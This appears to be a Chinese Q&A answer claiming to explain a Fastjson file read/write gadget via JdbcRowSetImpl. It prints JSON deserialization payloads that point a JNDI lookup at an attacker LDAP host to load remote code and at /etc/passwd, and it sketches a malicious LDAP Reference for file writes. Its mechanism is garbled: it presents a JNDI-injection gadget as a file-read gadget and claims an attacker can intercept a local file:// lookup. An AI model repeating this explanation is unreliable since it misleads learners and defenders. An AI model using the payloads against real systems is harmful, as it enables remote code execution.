### Fastjson 文件读写 gadget 是哪条，原理是什么

**Fastjson 文件读写 Gadget：`JdbcRowSetImpl`**

`JdbcRowSetImpl` 本身是一个 JDBC 相关的类，它的功能是通过 JNDI 来获取数据源。这个类在 Fastjson 中被利用，是因为它的 `dataSourceName` 属性在反序列化时，会触发一个 JNDI 查找

**攻击原理：从 JNDI 注入到文件读写**

这条 Gadget 的核心原理是利用 JNDI 协议的**文件查找功能**

1. **Fastjson 漏洞触发**： 攻击者构造一个恶意的 JSON 数据，其中包含 `JdbcRowSetImpl` 类，并将其 `dataSourceName` 属性设置为一个恶意的 URL

   ```json
   {
       "@type":"com.sun.rowset.JdbcRowSetImpl",
       "dataSourceName":"ldap://attacker-ip:1389/Exploit",
       "autoCommit":true
   }
   ```

   当 Fastjson 对这段 JSON 进行反序列化时，会实例化 `JdbcRowSetImpl` 对象，并调用其 `setDataSourceName()` 方法。这个方法会触发一个 JNDI 查找

2. **JNDI 文件查找**： JNDI 不仅支持 `ldap`、`rmi` 等协议，它也支持 `file` 协议。`file` 协议允许 JNDI 客户端查找本地的文件

3. **攻击者构造恶意 JNDI URL**： 攻击者在 `dataSourceName` 中，将协议从 `ldap` 替换为 `file`，并将文件路径设置为目标服务器上的敏感文件，例如 `/etc/passwd`

   ```json
   {
       "@type":"com.sun.rowset.JdbcRowSetImpl",
       "dataSourceName":"file:///etc/passwd",
       "autoCommit":true
   }
   ```

   当 Fastjson 反序列化这个 JSON 时，`JdbcRowSetImpl` 会向 JNDI 服务发起一个本地查找，查找 `/etc/passwd` 文件

4. **文件读取**： JNDI 服务找到这个文件后，会将其内容作为**一个 Java 对象**返回。这个对象包含了文件的内容。攻击者在自己的服务器上，通过监听端口，就可以截获这个 JNDI 响应，从而获取到 `/etc/passwd` 文件的内容

**为什么能实现“文件写入”？**

文件写入的原理与文件读取类似，但它利用的是 JNDI 对**`DataSource` 对象**的特殊处理

1. **构造恶意 `DataSource`**： 攻击者构造一个恶意的 `DataSource` 对象，这个对象在反序列化时，会执行文件写入操作
2. **JNDI 注入文件写入**： 攻击者将 `dataSourceName` 设置为一个可以触发 JNDI 注入的 URL，例如 `ldap://attacker-ip:1389/WriteFile`
3. **触发文件写入**： 在攻击者的 LDAP 服务器上，返回一个恶意的 `Reference` 对象，其 `factory` 指向一个可以执行文件写入操作的类。当目标服务器接收并加载这个 `Reference` 对象时，就会触发文件写入